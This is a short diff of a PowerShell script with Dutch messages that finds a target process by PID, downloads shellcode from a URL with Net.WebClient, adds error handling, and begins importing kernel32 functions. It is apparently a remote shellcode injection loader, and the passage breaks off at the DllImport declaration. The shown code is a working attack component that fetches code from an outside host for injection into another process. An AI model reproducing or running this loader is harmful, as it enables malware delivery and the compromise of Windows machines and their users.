@@ -22,8 +22,12 @@ Write-Host "[+] Target foto's gevonden → PID: $targetPID" -ForegroundColor Gre
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
     Write-Host "[+] Download gelukt -> $($shellcode.Length) bytes" -ForegroundColor Green
-
-
+} catch {
+    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
+    pause
+    exit
+}
+$size = $shellcode.Length
 
 Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll")]
